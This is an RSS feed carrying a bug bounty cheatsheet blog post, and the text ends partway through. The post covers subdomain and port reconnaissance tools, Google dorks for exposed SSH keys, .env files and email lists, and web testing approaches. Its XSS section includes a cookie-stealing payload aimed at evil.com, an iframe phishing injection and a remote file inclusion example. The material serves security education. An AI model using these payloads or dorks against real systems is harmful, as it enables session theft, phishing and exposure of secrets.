<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Exploits on Orangeymango</title><link>https://orangeymango.me/tags/exploits/</link><description>Recent content in Exploits on Orangeymango</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 24 Jul 2024 16:50:00 +0000</lastBuildDate><atom:link href="https://orangeymango.me/tags/exploits/index.xml" rel="self" type="application/rss+xml"/><item><title>Bug Bounty Essentials - A Comprehensive Cheatsheet</title><link>https://orangeymango.me/p/bug-bounty-essentials-a-comprehensive-cheatsheet/</link><pubDate>Wed, 24 Jul 2024 16:50:00 +0000</pubDate><guid>https://orangeymango.me/p/bug-bounty-essentials-a-comprehensive-cheatsheet/</guid><description>&lt;img src="https://miro.medium.com/v2/resize:fit:1400/1*wBuE9-f32uHnqH9Sq4EFiQ.png" alt="Featured image of post Bug Bounty Essentials - A Comprehensive Cheatsheet" />&lt;h1 id="recon-workflow">Recon Workflow
&lt;/h1>&lt;h2 id="1-initial-reconnaissance">1. Initial Reconnaissance
&lt;/h2>&lt;h3 id="11-finding-subdomains">1.1 Finding Subdomains
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>Linked &amp;amp; JS Discovery with Burp Suite Pro&lt;/strong>
&lt;ul>
&lt;li>Turn off passive scanning&lt;/li>
&lt;li>Set forms to auto-submit&lt;/li>
&lt;li>Configure scope and keywords&lt;/li>
&lt;li>Browse the main site&lt;/li>
&lt;li>Spider all hosts&lt;/li>
&lt;li>Go to Target → Scope → Advanced Scope Control → Add host or IP range&lt;/li>
&lt;li>Show only scope items&lt;/li>
&lt;li>Select all hosts → Engagement Tools → Analyze Target → Save report as HTML file&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Other Tools for Subdomain Discovery&lt;/strong>
&lt;ul>
&lt;li>&lt;code>Gospider&lt;/code>&lt;/li>
&lt;li>&lt;code>hakrawler&lt;/code>&lt;/li>
&lt;li>&lt;code>Subdomainizer&lt;/code>:
&lt;ul>
&lt;li>Find subdomains referenced in JS files&lt;/li>
&lt;li>Identify cloud services referenced in JS files&lt;/li>
&lt;li>Use Shannon Entropy formula to find potentially sensitive items in JS files&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>subscraper&lt;/code>: If only looking for subdomains&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Scraping with Amass&lt;/strong>
&lt;ul>
&lt;li>&lt;code>amass -d example.com&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Scraping with Subfinder v2&lt;/strong>
&lt;ul>
&lt;li>&lt;code>subfinder -d example.com -v&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Scraping with &lt;a class="link" href="http://github-subdomains.py/" target="_blank" rel="noopener"
>Github-subdomains.py&lt;/a>&lt;/strong>
&lt;ul>
&lt;li>&lt;code>python3 github-subdomains.py -t &amp;quot;githubpersonalaccounttoken&amp;quot; -d example.com &amp;gt; example.com&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Scraping with Cloud Ranges&lt;/strong>
&lt;ul>
&lt;li>Technique to monitor AWS, GCP, Azure for SSL&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="12-subdomain-brute-forcing">1.2 Subdomain Brute Forcing
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>With Amass&lt;/strong>
&lt;ul>
&lt;li>Guessing for live subdomains with a large list of common subdomain names&lt;/li>
&lt;li>&lt;code>amass enum -brute -d example.com -src&lt;/code>&lt;/li>
&lt;li>&lt;code>amass enum -brute -d example.com -rf resolvers.txt -w bruteforce.list&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>With shuffleDNS&lt;/strong>
&lt;ul>
&lt;li>&lt;code>shuffledns -d example.com -w words.txt -r resolvers-excellent.txt&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Subdomain Brute Forcing Lists&lt;/strong>
&lt;ul>
&lt;li>&lt;a class="link" href="https://github.com/tomnomnom" target="_blank" rel="noopener"
>Tomnomnom&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/Assetnote/commonspeak2" target="_blank" rel="noopener"
>Assetnote Commonspeak2&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Alteration Scanning&lt;/strong>
&lt;ul>
&lt;li>&lt;code>altdns&lt;/code>:
&lt;ul>
&lt;li>&lt;code>dev1.example.com&lt;/code>&lt;/li>
&lt;li>&lt;code>dev2.example.com&lt;/code>&lt;/li>
&lt;li>&lt;code>dev-1.example.com&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="2-infrastructure-discovery">2. Infrastructure Discovery
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>Finding Infrastructure Sources&lt;/strong>
&lt;ul>
&lt;li>Censys&lt;/li>
&lt;li>Robtex&lt;/li>
&lt;li>Wayback Machine&lt;/li>
&lt;li>DNSdumpster&lt;/li>
&lt;li>&lt;a class="link" href="http://ptrarchive.com/" target="_blank" rel="noopener"
>PTRarchive.com&lt;/a>&lt;/li>
&lt;li>Netcraft&lt;/li>
&lt;li>DNSDB Search&lt;/li>
&lt;li>PassiveTotal&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Certificate Sources&lt;/strong>
&lt;ul>
&lt;li>&lt;a class="link" href="https://crt.sh/" target="_blank" rel="noopener"
>crt.sh&lt;/a>&lt;/li>
&lt;li>Certspotter&lt;/li>
&lt;li>CertDB&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Security Sources&lt;/strong>
&lt;ul>
&lt;li>&lt;a class="link" href="https://hackertarget.com/" target="_blank" rel="noopener"
>Hackertarget&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://securitytrails.com/" target="_blank" rel="noopener"
>Security Trails&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.virustotal.com/" target="_blank" rel="noopener"
>VirusTotal&lt;/a>&lt;/li>
&lt;li>F-Secure&lt;/li>
&lt;li>Riddler&lt;/li>
&lt;li>&lt;a class="link" href="https://www.threatcrowd.org/" target="_blank" rel="noopener"
>ThreatCrowd&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.threatminer.org/" target="_blank" rel="noopener"
>ThreatMiner&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="3-port-analysis--service-analysis">3. Port Analysis &amp;amp; Service Analysis
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>Port Analysis with Massscan&lt;/strong>
&lt;ul>
&lt;li>&lt;code>massscan -p1-65535 &amp;lt;ip&amp;gt; --max-rate 1800 -oG outputfile.txt&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Port Analysis with Dnmasscan&lt;/strong>
&lt;ul>
&lt;li>&lt;code>dnmasscan outputfile.txt dns.log -p80,443 -oG masscan.log&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Service Scanning with Brutespray&lt;/strong>
&lt;ul>
&lt;li>Scan remote administration protocols for default passwords, which takes Nmap OG file format&lt;/li>
&lt;li>&lt;code>Massscan&lt;/code> → &lt;code>nmapservice scan -oG&lt;/code> → &lt;code>brutespray credential brute force&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="4-vulnerability-discovery">4. Vulnerability Discovery
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>Subdomain Takeover&lt;/strong>
&lt;ul>
&lt;li>&lt;a class="link" href="https://github.com/haccer/subjack" target="_blank" rel="noopener"
>Can I Take Over XYZ GitHub Repo&lt;/a>&lt;/li>
&lt;li>&lt;code>SubOver&lt;/code>&lt;/li>
&lt;li>&lt;code>nuclei&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Screenshotting&lt;/strong>
&lt;ul>
&lt;li>&lt;code>eyewitness&lt;/code>&lt;/li>
&lt;li>&lt;code>aquatone&lt;/code>&lt;/li>
&lt;li>&lt;code>httpscreenshot&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="5-google-dorking">5. Google Dorking
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>Scraping with Google&lt;/strong>
&lt;ul>
&lt;li>&lt;code>site:example.com -www.example.com&lt;/code>&lt;/li>
&lt;li>&lt;code>site:example.com -www.example.com -sub.example.com&lt;/code>&lt;/li>
&lt;li>&lt;code>site:example.com -www.example.com -sub.example.com -dev.example.com&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="6-automation-tools--frameworks">6. Automation Tools &amp;amp; Frameworks
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>Extending Tools&lt;/strong>
&lt;ul>
&lt;li>&lt;a class="link" href="https://github.com/codingo/Interlace" target="_blank" rel="noopener"
>Interlace&lt;/a>&lt;/li>
&lt;li>Recon Framework&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/tomnomnom/tools" target="_blank" rel="noopener"
>Tomnomnom Tools&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>C-tier Frameworks&lt;/strong>
&lt;ul>
&lt;li>&lt;a class="link" href="https://github.com/AdmiralGaust/bountyRecon" target="_blank" rel="noopener"
>AdmiralGaust/bountyRecon&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/offhoursscoding/recon" target="_blank" rel="noopener"
>offhoursscoding/recon&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/Sambal0x/recon-tools" target="_blank" rel="noopener"
>Sambal0x/recon-tools&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/JoshuaMart/Autorecon" target="_blank" rel="noopener"
>JoshuaMart/Autorecon&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/yourbuddy25/Hunter" target="_blank" rel="noopener"
>yourbuddy25/Hunter&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://gist.github.com/dwisiswant05f647e3d406b5e984e6d69d3538968cd" target="_blank" rel="noopener"
>ultimate_recon.sh&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>B-tier Frameworks&lt;/strong>
&lt;ul>
&lt;li>&lt;a class="link" href="https://github.com/capt-meelo/LazyRecon" target="_blank" rel="noopener"
>capt-meelo/LazyRecon&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/phspade/Automated-Scanner" target="_blank" rel="noopener"
>phspade/Automated-Scanner&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener"
>shmilylty/OneForAll&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/SolomonSklash/chomp-scan" target="_blank" rel="noopener"
>SolomonSklash/chomp-scan&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/TypeError/domained" target="_blank" rel="noopener"
>TypeError/domained&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/Screetsec/Sudomy" target="_blank" rel="noopener"
>Screetsec/Sudomy&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/devanshbatham/Gorecon" target="_blank" rel="noopener"
>devanshbatham/Gorecon&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/LordNeoStark/tugarecon" target="_blank" rel="noopener"
>LordNeoStark/tugarecon&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>A-tier Frameworks&lt;/strong>
&lt;ul>
&lt;li>&lt;a class="link" href="https://github.com/Edu4rdSHL/findomain" target="_blank" rel="noopener"
>Edu4rdSHL/findomain&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/SilverPoision/Rock-ON" target="_blank" rel="noopener"
>SilverPoision/Rock-ON&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/epi052/recon-pipeline" target="_blank" rel="noopener"
>epi052/recon-pipeline&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>S-tier Frameworks&lt;/strong>
&lt;ul>
&lt;li>&lt;a class="link" href="https://intrigue.io/" target="_blank" rel="noopener"
>Intrigue.io&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.assetnote.io/" target="_blank" rel="noopener"
>AssetNote&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.spiderfoot.net/" target="_blank" rel="noopener"
>Spiderfoot&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://chaos.projectdiscovery.io/" target="_blank" rel="noopener"
>Project Discovery Framework&lt;/a> - Download subdomain files of all public programs in HackerOne &amp;amp; Bugcrowd, watch for new domains&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="7-mindmaps">7. Mindmaps
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>XMind&lt;/strong>
&lt;ul>
&lt;li>&lt;a class="link" href="https://www.xmind.net/" target="_blank" rel="noopener"
>XMind - Mind Mapping Software&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h1 id="google-dork-techniques">Google Dork Techniques
&lt;/h1>&lt;h2 id="1-basic-search-operators">1. Basic Search Operators
&lt;/h2>&lt;ul>
&lt;li>
&lt;p>&lt;strong>cache:&lt;/strong>&lt;/p>
&lt;p>Shows the cached version of any website.&lt;/p>
&lt;p>Example: &lt;code>cache:example.com&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>allintext:&lt;/strong>&lt;/p>
&lt;p>Searches for specific text contained on any web page.&lt;/p>
&lt;p>Example: &lt;code>allintext: hacking tools&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>allintitle:&lt;/strong>&lt;/p>
&lt;p>Searches for pages with titles containing specific text.&lt;/p>
&lt;p>Example: &lt;code>allintitle:&amp;quot;Security Companies&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>allinurl:&lt;/strong>&lt;/p>
&lt;p>Fetches results whose URL contains all the specified characters.&lt;/p>
&lt;p>Example: &lt;code>allinurl: client area&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>filetype:&lt;/strong>&lt;/p>
&lt;p>Searches for specific file extensions.&lt;/p>
&lt;p>Example: &lt;code>filetype: jpg filename:id_rsa&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>inurl:&lt;/strong>&lt;/p>
&lt;p>Searches for URLs containing a specific keyword.&lt;/p>
&lt;p>Example: &lt;code>inurl: admin&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>intitle:&lt;/strong>&lt;/p>
&lt;p>Searches for keywords in the title of pages.&lt;/p>
&lt;p>Example: &lt;code>intitle:secu&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>inanchor:&lt;/strong>&lt;/p>
&lt;p>Searches for pages with exact anchor text used in links.&lt;/p>
&lt;p>Example: &lt;code>inanchor:&amp;quot;cyber security&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>intext:&lt;/strong>&lt;/p>
&lt;p>Locates pages containing certain strings inside their text.&lt;/p>
&lt;p>Example: &lt;code>intext:&amp;quot;safe internet&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>link:&lt;/strong>&lt;/p>
&lt;p>Shows pages linking to a specified URL.&lt;/p>
&lt;p>Example: &lt;code>link: microsoft.com&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>site:&lt;/strong>&lt;/p>
&lt;p>Shows a list of all indexed URLs for a specified domain or subdomain.&lt;/p>
&lt;p>Example: &lt;code>site:securitytrails.com&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>wildcard (*)&lt;/strong>&lt;/p>
&lt;p>Used to search for pages that contain “anything” before your word.&lt;/p>
&lt;p>Example: &lt;code>* a website&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>logical OR (|)&lt;/strong>&lt;/p>
&lt;p>Finds sites containing either one term or another.&lt;/p>
&lt;p>Example: &lt;code>&amp;quot;security&amp;quot; &amp;quot;tips&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>plus (+)&lt;/strong>&lt;/p>
&lt;p>Concatenates words to detect pages using more than one specific key.&lt;/p>
&lt;p>Example: &lt;code>security + trails&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>minus (-)&lt;/strong>&lt;/p>
&lt;p>Excludes pages containing certain words.&lt;/p>
&lt;p>Example: &lt;code>security -trails&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="2-advanced-search-techniques">2. Advanced Search Techniques
&lt;/h2>&lt;ul>
&lt;li>
&lt;p>&lt;strong>Log Files&lt;/strong>&lt;/p>
&lt;p>Searches for results including usernames inside log files.&lt;/p>
&lt;p>Example: &lt;code>allintext:username filetype:log&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Vulnerable Web Servers&lt;/strong>&lt;/p>
&lt;p>Detects vulnerable or hacked servers.&lt;/p>
&lt;p>Example: &lt;code>inurl:/proc/self/cwd&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Open FTP Servers&lt;/strong>&lt;/p>
&lt;p>Finds public FTP servers which may reveal interesting information.&lt;/p>
&lt;p>Example: &lt;code>intitle:&amp;quot;index of&amp;quot; inurl:ftp&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ENV Files&lt;/strong>&lt;/p>
&lt;p>Searches for .env files used by web development frameworks.&lt;/p>
&lt;p>Example: &lt;code>site:example.com/.env&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>SSH Private Keys&lt;/strong>&lt;/p>
&lt;p>Finds exposed SSH private keys.&lt;/p>
&lt;p>Example: &lt;code>intitle:index.of id_rsa -id_rsa.pub&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Putty Logs&lt;/strong>&lt;/p>
&lt;p>Fetches SSH usernames from Putty logs.&lt;/p>
&lt;p>Example: &lt;code>filetype:log username putty&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Email Lists&lt;/strong>&lt;/p>
&lt;p>Searches for Excel files containing email addresses.&lt;/p>
&lt;p>Example: &lt;code>filetype:xls inurl:&amp;quot;email.xls&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>University Email Lists&lt;/strong>&lt;/p>
&lt;p>Filters for .edu domain names to find educational email lists.&lt;/p>
&lt;p>Example: &lt;code>site:.edu filetype:xls inurl:&amp;quot;email.xls&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="3-media-and-camera-searches">3. Media and Camera Searches
&lt;/h2>&lt;ul>
&lt;li>
&lt;p>&lt;strong>Live Cameras&lt;/strong>&lt;/p>
&lt;p>Fetches live camera web pages not restricted by IP.&lt;/p>
&lt;p>Example: &lt;code>inurl:top.htm inurl:currenttime&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>WebcamXP-Based Transmissions&lt;/strong>&lt;/p>
&lt;p>Finds webcamXP-based live streams.&lt;/p>
&lt;p>Example: &lt;code>intitle:&amp;quot;webcamXP 5&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>General Live Cameras&lt;/strong>&lt;/p>
&lt;p>Finds general live camera feeds.&lt;/p>
&lt;p>Example: &lt;code>inurl:&amp;quot;lvappl.htm&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>MP3 Files&lt;/strong>&lt;/p>
&lt;p>Searches for MP3 files available on the web.&lt;/p>
&lt;p>Example: &lt;code>intitle: index of mp3&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>PDF Files&lt;/strong>&lt;/p>
&lt;p>Finds legal free PDF documents.&lt;/p>
&lt;p>Example: &lt;code>intitle: index of pdf intext: .mp4&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Weather Devices&lt;/strong>&lt;/p>
&lt;p>Fetches transmissions from Weather Wing devices.&lt;/p>
&lt;p>Example: &lt;code>intitle:&amp;quot;Weather Wing WS-2&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h1 id="vulnerability-testing-and-approaches">Vulnerability Testing and Approaches
&lt;/h1>&lt;h3 id="1-privilege-escalation">1. Privilege Escalation
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong> Horizontal (admin-admin &amp;amp; user to user) / Vertical Privilege Escalation (User to admin)&lt;/p>
&lt;hr>
&lt;h3 id="2-privacy-settings-bugs">2. Privacy Settings Bugs
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong> (Details missing)&lt;/p>
&lt;hr>
&lt;h3 id="3-session-bugs">3. Session Bugs
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Check if session tokens/access tokens:
&lt;ul>
&lt;li>Expires on logout&lt;/li>
&lt;li>Password reset/change&lt;/li>
&lt;li>Expires on user removal&lt;/li>
&lt;li>Expires on changing roles&lt;/li>
&lt;li>Insufficient session fixation (cookie editor extension used)****&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="4-insecure-cors-misconfiguration">4. Insecure CORS Misconfiguration
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Curl command to detect: &lt;code>curl &amp;lt;http://site.com&amp;gt; -H &amp;quot;Origin:&amp;lt;http://evil.com&amp;gt;&amp;quot; -I&lt;/code>&lt;/li>
&lt;li>Check &lt;code>Access-Control-Allow-Origin&lt;/code> header:
&lt;ul>
&lt;li>`` (not exploitable)&lt;/li>
&lt;li>&lt;code>origin: evil.com&lt;/code>&lt;/li>
&lt;li>&lt;code>origin: site.evil.com&lt;/code>&lt;/li>
&lt;li>&lt;code>origin: null&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>If any site disclosing usernames &amp;amp; password, try CORS exploit.&lt;strong>Tool Used:&lt;/strong> Corsy / Burp Suite&lt;/li>
&lt;/ul>
&lt;h3 id="5-csrf">5. CSRF
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Intercept the victim request &amp;amp; generate CSRF PoC; send to server as an attacker&lt;/li>
&lt;li>CSRF can be GET or POST based&lt;/li>
&lt;li>Try in all state-changing requests&lt;/li>
&lt;li>Use &lt;a class="link" href="http://jsfiddle.net/" target="_blank" rel="noopener"
>jsfiddle.net&lt;/a> online tool&lt;/li>
&lt;li>Check if it validates origin/referer. If not, CSRF is possible.&lt;/li>
&lt;li>Check if it is cookie-based authentication.&lt;/li>
&lt;li>If anti-CSRF tokens are present:
&lt;ol>
&lt;li>Remove anti-CSRF tokens &amp;amp; parameter&lt;/li>
&lt;li>Pass blank parameter&lt;/li>
&lt;li>Add similar length token&lt;/li>
&lt;li>Add another user’s valid anti-CSRF token&lt;/li>
&lt;li>Random token in long length (e.g., &lt;code>aaaaaaaaa&lt;/code>)&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>If content-type verification:
&lt;ol>
&lt;li>If no anti-CSRF tokens are present&lt;/li>
&lt;li>Try content-type: &lt;code>text/plain&lt;/code>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>Flash CSRF&lt;/li>
&lt;li>Check if any cross-domain policy using SWF JSON tool.&lt;strong>Tool Used:&lt;/strong> &lt;a class="link" href="http://jsfiddle.net/" target="_blank" rel="noopener"
>jsfiddle.net&lt;/a> / Burp Suite&lt;/li>
&lt;/ul>
&lt;h3 id="6-xss">6. XSS
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Input value (try payload like &lt;code>&amp;quot;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;quot;&lt;/code>) reflected without XSS protection&lt;/li>
&lt;li>Use XSS validator - Intruder&lt;/li>
&lt;li>Host header injection through XSS:
&lt;ul>
&lt;li>Add &lt;code>referer: batman&lt;/code>&lt;/li>
&lt;li>Add &lt;code>hostheader: bing.com&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>URL redirection through XSS:
&lt;ul>
&lt;li>&lt;code>document.location.href=&amp;quot;&amp;lt;http://evil.com&amp;gt;&amp;quot;&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Phishing through XSS - iframe injection:
&lt;ul>
&lt;li>&lt;code>&amp;lt;iframe src=&amp;quot;&amp;lt;http://evil.com&amp;gt;&amp;quot; height=&amp;quot;100&amp;quot; width=&amp;quot;100&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Cookie stealing through XSS:
&lt;ul>
&lt;li>&lt;code>document.location.href=&amp;quot;&amp;lt;http://evil.com/p/?page=&amp;gt;&amp;quot; + document.cookie&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>File upload through XSS:
&lt;ul>
&lt;li>Upload a picture file, intercept it, and change &lt;code>picture.jpg&lt;/code> to XSS payload using Intruder attack&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Remote File Inclusion (RFI) through XSS:
&lt;ul>
&lt;li>&lt;code>php?=http://brutelogic.com.br/poc.svg - xsspayload&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Convert self XSS to reflected one:
&lt;ul>
&lt;li>Copy response in a &lt;code>file.html&lt;/code> -&amp;gt; it will work&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>XSS through URI parameters:
&lt;ul>
&lt;li>&lt;code>site.com/about/xss&amp;quot;&amp;gt;&amp;lt;script&amp;gt;&lt;/code>&lt;strong>Tool Used:&lt;/strong> XSS Validator / Burp Suite&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="7-host-header-injection">7. Host Header Injection
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>URL redirection through host header:
&lt;ul>
&lt;li>Check URL having 2xx, 3xx&lt;/li>
&lt;li>Change &lt;code>X-forwarded-host&lt;/code> to &lt;code>realweb.com&lt;/code> and &lt;code>bing.com&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Web cache poisoning through Host Header Injection:
&lt;ul>
&lt;li>Injection will be reflected in any buttons of the page&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Host header attack on password reset page&lt;/li>
&lt;li>XSS through Host Header Injection****&lt;/li>
&lt;/ol>
&lt;h3 id="8-url-redirection-or-open-redirect">8. URL Redirection or Open Redirect
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Common parameter list:
&lt;ul>
&lt;li>&lt;code>dest&lt;/code>, &lt;code>redirect&lt;/code>, &lt;code>uri&lt;/code>, &lt;code>path&lt;/code>, &lt;code>continue&lt;/code>, &lt;code>url&lt;/code>, &lt;code>window&lt;/code>, &lt;code>to&lt;/code>, &lt;code>out&lt;/code>, &lt;code>view&lt;/code>, &lt;code>dir&lt;/code>, &lt;code>show&lt;/code>, &lt;code>navigation&lt;/code>, &lt;code>open&lt;/code>, &lt;code>u&lt;/code>, &lt;code>file&lt;/code>, &lt;code>val&lt;/code>, &lt;code>validate&lt;/code>, &lt;code>domain&lt;/code>, &lt;code>callback&lt;/code>, &lt;code>return&lt;/code>, &lt;code>page&lt;/code>, &lt;code>feed&lt;/code>, &lt;code>host&lt;/code>, &lt;code>port&lt;/code>, &lt;code>next&lt;/code>, &lt;code>data&lt;/code>, &lt;code>reference&lt;/code>, &lt;code>site&lt;/code>, &lt;code>html&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Test URLs:
&lt;ul>
&lt;li>&lt;code>site.com/bing.com&lt;/code>, &lt;code>site.com//bing.com&lt;/code>, &lt;code>site.com/payloads&lt;/code>****&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="9-parameter-tampering">9. Parameter Tampering
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong> Apply to ecommerce websites&lt;/p>
&lt;hr>
&lt;h3 id="10-html-injection">10. HTML Injection
&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Use GET or POST method&lt;/li>
&lt;li>Input value reflecting back&lt;/li>
&lt;li>Test with HTML payload like &lt;code>&amp;lt;h1&amp;gt;adam&amp;lt;/h1&amp;gt;&lt;/code>&lt;/li>
&lt;li>URL redirection via HTML injection****&lt;/li>
&lt;/ol>
&lt;h3 id="11-file-inclusion">11. File Inclusion
